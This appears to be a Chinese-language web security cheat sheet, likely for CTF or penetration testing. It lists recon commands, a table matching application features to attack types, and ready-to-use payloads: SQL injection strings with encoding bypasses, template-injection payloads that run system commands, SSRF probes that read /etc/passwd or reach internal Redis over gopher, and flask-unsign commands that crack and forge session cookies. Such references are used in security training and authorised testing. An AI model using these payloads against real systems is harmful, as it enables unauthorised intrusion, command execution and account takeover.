# Web 安全速查

## 前置

```bash
pip install requests flask-unsign jwt pycryptodome
```

## 快速侦察

```bash
curl -sI https://target | head -20
curl -s https://target/robots.txt
curl -s https://target/.git/HEAD
gobuster dir -u https://target -w /usr/share/wordlists/Web-Fuzzing-Box/dir.txt
```

## 攻击决策表

| 特征 | 攻击方向 |
|------|----------|
| 登录/注册/密码重置 | 认证绕过 + JWT + SQLi |
| 搜索/过滤/表单 | SQLi + SSTI + XXE |
| 文件上传 | 文件上传RCE |
| API端点 (JSON/GraphQL) | 反序列化 + 原型污染 |
| Cookie/Token/Session | JWT攻击 + 会话劫持 |
| URL参数/路径 | SSRF + LFI + 路径穿越 |
| 管理Bot | XSS + CSRF + XS-Leak |

## SQLi

```sql
-- 快速测试
' OR '1'='1
' OR 1=1--
' UNION SELECT 1,2,3--

-- 宽字节绕过 (GBK)
%df' UNION SELECT 1,2,3--+

-- 反斜杠转义绕过
username=\&password= OR 1=1--
```

## SSTI

| 引擎 | 测试 payload |
|------|-------------|
| Jinja2 | `{{7*7}}` → `{{config}}` → `{{''.__class__.__mro__[2].__subclasses__()}}` |
| Mako | `<% import os; print(os.popen('id').read()) %>` |
| Thymeleaf | `__|$${T(java.lang.Runtime).getRuntime().exec("id")}|__::.x` |

## SSRF

```bash
# 内网探测
curl -s 'http://target/fetch?url=http://127.0.0.1:8080'
# gopher 协议 (发送任意TCP)
curl -s 'http://target/fetch?url=gopher://127.0.0.1:6379/_*2%0d%0a...'
# file 协议
curl -s 'http://target/fetch?url=file:///etc/passwd'
```

## JWT

```python
# flask-unsign 爆破
flask-unsign --unsign --cookie "<cookie>" --wordlist /usr/share/wordlists/rockyou.txt

# 伪造
flask-unsign --sign --cookie "{'user':'admin'}" --secret "<找到的secret>"
```

## 常见陷阱

- URL编码失真（+ vs %20）在多代理层场景最容易被忽略
- 禁用 JavaScript 后可能存在安全配置差异
- GraphQL introspection 默认可能开启
